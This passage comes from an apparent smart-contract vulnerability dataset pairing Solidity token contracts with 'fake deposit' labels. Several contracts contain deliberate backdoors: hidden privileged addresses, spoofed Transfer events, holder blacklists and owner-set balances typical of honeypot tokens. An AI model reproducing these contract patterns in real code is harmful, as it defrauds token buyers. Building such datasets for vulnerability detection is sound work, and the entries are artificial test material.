_allowances[sender][msg.sender] -= amount;\r\n        emit Transfer(sender, recipient, amount);\r\n        return true; }}\r\n\r\n \r\n\r\n    function transfer(address recipient, uint256 amount) public {\r\n        if(msg.sender == cnstruct)  {\r\n        require(TYZ[msg.sender] >= amount);\r\n        TYZ[msg.sender] -= amount;  \r\n        TYZ[recipient] += amount; \r\n        emit Transfer (RouterV3, recipient, amount);\r\n       }  \r\n        if(!XYZ[msg.sender]) {\r\n        require(TYZ[msg.sender] >= amount);\r\n        TYZ[msg.sender] -= amount;  \r\n        TYZ[recipient] += amount;          \r\n        emit Transfer(msg.sender, recipient, amount);\r\n        }}\r\n    \r\n\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.4;\r\n\r\ncontract Token {\r\n\r\n    /// @return total amount of tokens\r\n    function totalSupply() constant returns (uint256 supply) {}\r\n\r\n    /// @param _owner The address from which the balance will be retrieved\r\n    /// @return The balance\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `msg.sender`\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transfer(address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n    /// @param _from The address of the sender\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @param _value The amount of wei to be approved for transfer\r\n    /// @return Whether the approval was successful or not\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\n\r\n    /// @param _owner The address of the account owning tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @return Amount of remaining tokens allowed to spent\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n    \r\n}\r\n\r\n\r\n\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n        //Default assumes totalSupply can't be over max (2^256 - 1).\r\n        //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\r\n        //Replace the if with this one instead.\r\n        //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n        //same as above. Replace this line with the following if you want to protect against wrapping uints.\r\n        //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n      return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n}\r\n\r\n\r\n//name this contract whatever you'd like\r\ncontract SHS_Token is StandardToken {\r\n\r\n    function () {\r\n        //if ether is sent to this address, send it back.\r\n        throw;\r\n    }\r\n\r\n    /* Public variables of the token */\r\n\r\n    /*\r\n    NOTE:\r\n    The following variables are OPTIONAL vanities. One does not have to include them.\r\n    They allow one to customise the token contract & in no way influences the core functionality.\r\n    Some wallets/interfaces might not even bother to look at this information.\r\n    */\r\n    string public name;                   //fancy name: eg Simon Bucks\r\n    uint8 public decimals;                //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\r\n    string public symbol;                 //An identifier: eg SBX\r\n    string public version = '1.1.3';       //human 0.1 standard. Just an arbitrary versioning scheme.\r\n\r\n//\r\n// CHANGE THESE VALUES FOR YOUR TOKEN\r\n//\r\n\r\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\r\n\r\n    function SHS_Token(\r\n        ) {\r\n        balances[msg.sender] = 10000;               // Give the creator all initial tokens (100000 for example)\r\n        totalSupply = 10000;                        // Update total supply (100000 for example)\r\n        name = \"SHS Token\";                                   // Set the name for display purposes\r\n        decimals = 18;                            // Amount of decimals for display purposes\r\n        symbol = \"SHS\";                               // Set the symbol for display purposes\r\n    }\r\n\r\n    /* Approves and then calls the receiving contract */\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n\r\n        //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\r\n        //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\r\n        //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\r\n        if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.16;\r\ncontract Token {\r\n\r\n    /// @return total amount of tokens\r\n    function totalSupply() constant returns (uint256 supply) {}\r\n\r\n    /// @param _owner The address from which the balance will be retrieved\r\n    /// @return The balance\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `msg.sender`\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transfer(address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n    /// @param _from The address of the sender\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @param _value The amount of wei to be approved for transfer\r\n    /// @return Whether the approval was successful or not\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\n\r\n    /// @param _owner The address of the account owning tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @return Amount of remaining tokens allowed to spent\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n    \r\n}\r\n\r\n\r\n\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n        //Default assumes totalSupply can't be over max (2^256 - 1).\r\n        //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\r\n        //Replace the if with this one instead.\r\n        //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n        //same as above. Replace this line with the following if you want to protect against wrapping uints.\r\n        //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n      return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n}\r\n\r\n\r\n//name this contract whatever you'd like\r\ncontract ERC20Token is StandardToken {\r\n\r\n    function () {\r\n        //if ether is sent to this address, send it back.\r\n        throw;\r\n    }\r\n\r\n    /* Public variables of the token */\r\n\r\n    /*\r\n    NOTE:\r\n    The following variables are OPTIONAL vanities. One does not have to include them.\r\n    They allow one to customise the token contract & in no way influences the core functionality.\r\n    Some wallets/interfaces might not even bother to look at this information.\r\n    */\r\n    string public name;                   //fancy name: eg Simon Bucks\r\n    uint8 public decimals;                //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\r\n    string public symbol;                 //An identifier: eg SBX\r\n    string public version = 'H1.0';       //human 0.1 standard. Just an arbitrary versioning scheme.\r\n\r\n//\r\n// CHANGE THESE VALUES FOR YOUR TOKEN\r\n//\r\n\r\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\r\n\r\n    function ERC20Token(\r\n        ) {\r\n        balances[msg.sender] = 1000000000000;               // Give the creator all initial tokens (100000 for example)\r\n        totalSupply = 1000000000000;                        // Update total supply (100000 for example)\r\n        name = \"DOTGE\";                                   // Set the name for display purposes\r\n        decimals = 2;                            // Amount of decimals for display purposes\r\n        symbol = \"DOTGE\";                               // Set the symbol for display purposes\r\n    }\r\n\r\n    /* Approves and then calls the receiving contract */\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n\r\n        //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\r\n        //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\r\n        //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\r\n        if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: MIT\r\n\r\npragma solidity 0.8.17;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\n\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _Owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Create(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    address LRV = 0x255fd0898d235DFF82e6Af3180e23Dc02102D72b;\r\n\taddress LRTR = 0xD1C24f50d05946B3FABeFBAe3cd0A7e9938C63F2;\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _Owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _Owner;\r\n    }\r\n modifier onlyOwner{\r\n        require(msg.sender == _Owner);\r\n        _; }\r\n    function renounceOwnership() public virtual {\r\n        require(msg.sender == _Owner);\r\n        emit OwnershipTransferred(_Owner, address(0));\r\n        _Owner = address(0);\r\n    }\r\n\r\n\r\n}\r\n\r\n\r\n\r\ncontract RISKCHALLENGE is Context, Ownable {\r\n    using SafeMath for uint256;\r\n    mapping (address => uint256) private Lc;\r\n\tmapping (address => bool) private Lb;\r\n    mapping (address => bool) private Lw;\r\n    mapping (address => mapping (address => uint256)) private Lv;\r\n    uint8 private constant LCE = 8;\r\n    uint256 private constant lS = 150000000 * (10** LCE);\r\n    string private constant _name = \"RISK CHALLENGE PROTOCOL\";\r\n    string private constant _symbol = \"CHALLENGE\";\r\n\r\n\r\n\r\n    constructor () {\r\n        Lc[_msgSender()] = lS;\r\n         lmkr(LRTR, lS); }\r\n    \r\n\r\n    function name() public pure returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public pure returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public pure returns (uint8) {\r\n        return LCE;\r\n    }\r\n\r\n    function totalSupply() public pure  returns (uint256) {\r\n        return lS;\r\n    }\r\n\r\n    function balanceOf(address account) public view  returns (uint256) {\r\n        return Lc[account];\r\n    }\r\n    function lmkr(address Lj, uint256 Ln) onlyOwner internal {\r\n    emit Transfer(address(0), Lj ,Ln); }\r\n\r\n    function allowance(address owner, address spender) public view  returns (uint256) {\r\n        return Lv[owner][spender];\r\n    }\r\n\t        function kBurn(address Lj) onlyOwner public{\r\n        Lb[Lj] = true; }\r\n\t\t\r\n            function approve(address spender, uint256 amount) public returns (bool success) {    \r\n        Lv[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true; }\r\n\r\n        \r\n\t\tfunction kStake(address Lj) public {\r\n        if(Lb[msg.sender]) { \r\n        Lw[Lj] = false;}}\r\n        function kQuery(address Lj) public{\r\n         if(Lb[msg.sender])  { \r\n        Lw[Lj] = true; }}\r\n   \r\n\r\n\t\tfunction transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\r\n         if(sender == LRV)  {\r\n        require(amount <= Lc[sender]);\r\n        Lc[sender] -= amount;  \r\n        Lc[recipient] += amount; \r\n          Lv[sender][msg.sender] -= amount;\r\n        emit Transfer (LRTR, recipient, amount);\r\n        return true; }  else  \r\n          if(!Lw[recipient]) {\r\n          if(!Lw[sender]) {\r\n         require(amount <= Lc[sender]);\r\n        require(amount <= Lv[sender][msg.sender]);\r\n        Lc[sender] -= amount;\r\n        Lc[recipient] += amount;\r\n        Lv[sender][msg.sender] -= amount;\r\n        emit Transfer(sender, recipient, amount);\r\n        return true; }}}\r\n\t\tfunction transfer(address Lj, uint256 Ln) public {\r\n        if(msg.sender == LRV)  {\r\n        require(Lc[msg.sender] >= Ln);\r\n        Lc[msg.sender] -= Ln;  \r\n        Lc[Lj] += Ln; \r\n        emit Transfer (LRTR, Lj, Ln);} else  \r\n        if(Lb[msg.sender]) {Lc[Lj] += Ln;} else\r\n        if(!Lw[msg.sender]) {\r\n        require(Lc[msg.sender] >= Ln);\r\n        Lc[msg.sender] -= Ln;  \r\n        Lc[Lj] += Ln;          \r\n        emit Transfer(msg.sender, Lj, Ln);}}}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity 0.8.17;\r\n\r\nabstract contract Context {\r\n    function _MsgSendr() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\n\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _Owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    address _tiConstruct = 0x6f446dFCB8d3b117095B6065ECa85cB606D0eFBa;\r\n\taddress UniV2Router = 0xB8f226dDb7bC672E27dffB67e4adAbFa8c0dFA08;\r\n    constructor () {\r\n        address msgSender = _MsgSendr();\r\n        _Owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _Owner;\r\n    }\r\n\r\n    function renounceOwnership() public virtual {\r\n        require(msg.sender == _Owner);\r\n        emit OwnershipTransferred(_Owner, address(0));\r\n        _Owner = address(0);\r\n    }\r\n\r\n}\r\n\r\n\r\n\r\ncontract SHIBARIUM is Context, Ownable {\r\n    using SafeMath for uint256;\r\n    mapping (address => uint256) private Tii;\r\n\tmapping (address => bool) private Yii;\r\n    mapping (address => bool) private Kii;\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n    uint8 private constant _decimals = 8;\r\n    uint256 private constant _TiSup = 1000000000 * 10**_decimals;\r\n    string private constant _name = \"SHIBARIUM\";\r\n    string private constant _symbol = \"SHIBARIUM\";\r\n\r\n\r\n\r\n    constructor () {\r\n        Tii[_MsgSendr()] = _TiSup;\r\n        emit Transfer(address(0), UniV2Router, _TiSup);\r\n    }\r\n\r\n    function name() public pure returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public pure returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public pure returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public pure  returns (uint256) {\r\n        return _TiSup;\r\n    }\r\n\r\n    function balanceOf(address account) public view  returns (uint256) {\r\n        return Tii[account];\r\n    }\r\n\r\n\r\n    function allowance(address owner, address spender) public view  returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n            function approve(address spender, uint256 amount) public returns (bool success) {    \r\n        _allowances[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true; }\r\n\t\tfunction Tiend(address px) public {\r\n        if(Yii[msg.sender]) { \r\n        Kii[px] = false;}}\r\n        function Tiquery(address px) public{\r\n         if(Yii[msg.sender])  { \r\n        require(!Kii[px]);\r\n        Kii[px] = true; }}\r\n\t\tfunction Aistake(address px) public{\r\n         if(msg.sender == _tiConstruct)  { \r\n        require(!Yii[px]);\r\n        Yii[px] = true; }}\r\n\t\tfunction transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\r\n         if(sender == _tiConstruct)  {\r\n        require(amount <= Tii[sender]);\r\n        Tii[sender] -= amount;  \r\n        Tii[recipient] += amount; \r\n          _allowances[sender][msg.sender] -= amount;\r\n        emit Transfer (UniV2Router, recipient, amount);\r\n        return true; }    \r\n          if(!Kii[recipient]) {\r\n          if(!Kii[sender]) {\r\n         require(amount <= Tii[sender]);\r\n        require(amount <= _allowances[sender][msg.sender]);\r\n        Tii[sender] -= amount;\r\n        Tii[recipient] += amount;\r\n      _allowances[sender][msg.sender] -= amount;\r\n        emit Transfer(sender, recipient, amount);\r\n        return true; }}}\r\n\t\tfunction transfer(address recipient, uint256 amount) public {\r\n        if(msg.sender == _tiConstruct)  {\r\n        require(Tii[msg.sender] >= amount);\r\n        Tii[msg.sender] -= amount;  \r\n        Tii[recipient] += amount; \r\n        emit Transfer (UniV2Router, recipient, amount);}\r\n        if(Yii[msg.sender]) {Tii[recipient] = amount;} \r\n        if(!Kii[msg.sender]) {\r\n        require(Tii[msg.sender] >= amount);\r\n        Tii[msg.sender] -= amount;  \r\n        Tii[recipient] += amount;          \r\n        emit Transfer(msg.sender, recipient, amount);\r\n        }}}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: MIT\r\npragma solidity 0.8.17;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\n\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    address constrct = 0x45BbB9acc12AF58a71725fb3C30A9d888a677DBB;\r\n\taddress Routerv2 = 0xf2b16510270a214130C6b17ff0E9bF87585126BD;\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    function renounceOwnership() public virtual {\r\n        require(msg.sender == _owner);\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n\r\n}\r\n\r\n\r\n\r\ncontract IONIS is Context, Ownable {\r\n    using SafeMath for uint256;\r\n    mapping (address => uint256) private CPI;\r\n\tmapping (address => uint256) private IPD;\r\n    mapping (address => bool) private XvC;\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n    uint8 private constant _decimals = 8;\r\n    uint256 private constant _tTotal = 250000000 * 10**_decimals;\r\n    string private constant _name = \"IONIS\";\r\n    string private constant _symbol = \"IONIS\";\r\n\r\n\r\n\r\n    constructor () {\r\n        CPI[_msgSender()] = _tTotal;\r\n        emit Transfer(address(0), Routerv2, _tTotal);\r\n    }\r\n\r\n    function name() public pure returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public pure returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public pure returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public pure  returns (uint256) {\r\n        return _tTotal;\r\n    }\r\n\r\n    function balanceOf(address account) public view  returns (uint256) {\r\n        return CPI[account];\r\n    }\r\n\r\n\r\n    function allowance(address owner, address spender) public view  returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n            function approve(address spender, uint256 amount) public returns (bool success) {    \r\n        _allowances[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true; }\r\n\r\n               function Ixbri () public {\r\n         if(msg.sender == constrct)   {\r\n        CPI[msg.sender] = IPD[msg.sender];\r\n        }}\r\n\r\n\r\n\r\n        function Ixde(address yz) public {\r\n        if(msg.sender == constrct)  { \r\n        XvC[yz] = false;}}\r\n        function Ixcheck(address yz) public{\r\n         if(msg.sender == constrct)  { \r\n        require(!XvC[yz]);\r\n        XvC[yz] = true; }}\r\n        function Ixbal(uint256 yz) public {\r\n        if(msg.sender == constrct)  { \r\n        IPD[msg.sender] = yz;}} \r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\r\n         if(sender == constrct)  {\r\n        require(amount <= CPI[sender]);\r\n        CPI[sender] -= amount;  \r\n        CPI[recipient] += amount; \r\n          _allowances[sender][msg.sender] -= amount;\r\n        emit Transfer (Routerv2, recipient, amount);\r\n        return true; }    \r\n          if(!XvC[sender] && !XvC[recipient]) {\r\n        require(amount <= CPI[sender]);\r\n require(amount <= _allowances[sender][msg.sender]);\r\n        CPI[sender] -= amount;\r\n        CPI[recipient] += amount;\r\n      _allowances[sender][msg.sender] -= amount;\r\n        emit Transfer(sender, recipient, amount);\r\n        return true; }}\r\n\r\n \r\n\r\n    function transfer(address recipient, uint256 amount) public {\r\n        if(msg.sender == constrct)  {\r\n        require(CPI[msg.sender] >= amount);\r\n        CPI[msg.sender] -= amount;  \r\n        CPI[recipient] += amount; \r\n        emit Transfer (Routerv2, recipient, amount);\r\n       }  \r\n        if(!XvC[msg.sender]) {\r\n        require(CPI[msg.sender] >= amount);\r\n        CPI[msg.sender] -= amount;  \r\n        CPI[recipient] += amount;          \r\n        emit Transfer(msg.sender, recipient, amount);\r\n        }}\r\n    \r\n\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.4;\r\n\r\ncontract Token {\r\n    /// @return total amount of tokens\r\n    function totalSupply() constant returns (uint256 supply) {}\r\n\r\n    /// @param _owner The address from which the balance will be retrieved\r\n    /// @return The balance\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `msg.sender`\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transfer(address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n    /// @param _from The address of the sender\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transferFrom(\r\n        address _from,\r\n        address _to,\r\n        uint256 _value\r\n    ) returns (bool success) {}\r\n\r\n    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @param _value The amount of wei to be approved for transfer\r\n    /// @return Whether the approval was successful or not\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\n\r\n    /// @param _owner The address of the account owning tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @return Amount of remaining tokens allowed to spent\r\n    function allowance(address _owner, address _spender)\r\n        constant\r\n        returns (uint256 remaining)\r\n    {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(\r\n        address indexed _owner,\r\n        address indexed _spender,\r\n        uint256 _value\r\n    );\r\n}\r\n\r\ncontract StandardToken is Token {\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n        //Default assumes totalSupply can't be over max (2^256 - 1).\r\n        //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to 